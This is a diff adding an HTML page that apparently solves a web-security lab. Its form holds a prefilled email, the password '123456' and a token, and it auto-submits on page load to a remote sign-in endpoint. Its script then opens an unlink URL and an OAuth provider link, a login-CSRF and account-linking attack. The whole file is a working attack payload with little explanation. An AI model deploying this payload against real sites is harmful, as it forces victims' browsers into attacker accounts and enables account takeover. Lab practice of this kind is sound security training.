@@ -1,0 +1,28 @@
+<form id="new_user" action="http://authorization-ptl-e1b893763806-f5c797687ef6.libcurl.me/users/sign_in"
+    accept-charset="UTF-8" method="post" >
+    <input type="hidden" name="authenticity_token" value="3sxVKXkW0nWpijMogkpe/HjwINNTxcz+DGPRu2A7ObF1rMq9FbYHoA4844QYpLUnHPHEStYhnsg4rA+oZKhYtg==">
+    <input autofocus="autofocus" autocomplete="email" type="email" value="martin@gmail.com" name="user[email]" id="user_email">
+    <input autocomplete="current-password" type="password" name="user[password]" id="user_password" value="123456">
+    <input name="user[remember_me]" type="hidden" value="1">
+    <input type="checkbox" value="1" name="user[remember_me]"id="user_remember_me">
+    <input type="submit" name="commit" value="Log in" data-disable-with="Log in">
+</form>
+
+<!--<iframe name="myIframe" id="myIframe" src="http://authorization-ptl-e1b893763806-f5c797687ef6.libcurl.me/users/sign_in" style="display:none;"></iframe> -->
+
+<script>
+    window.onload = function () {
+        var myform =  document.getElementById('new_user')
+        var form = myform;
+        var formClone = form.cloneNode(true); // clone the form
+        formClone.target = '_blank'; // set target to blank to open in new tab
+        document.body.appendChild(formClone); // append the cloned form to the body
+        formClone.submit(); // submit the cloned form
+        document.body.removeChild(formClone); // remove the cloned form from the body
+        window.open('http://ptl-e1b893763806-f5c797687ef6.libcurl.me/unlink', '_blank');
+        setTimeout(function() {
+            // Your code here will run after a delay of 500 milliseconds
+            window.open('http://ptl-e1b893763806-f5c797687ef6.libcurl.me/users/auth/myprovider', '_blank');
+          }, 1000);
+    }
+</script>
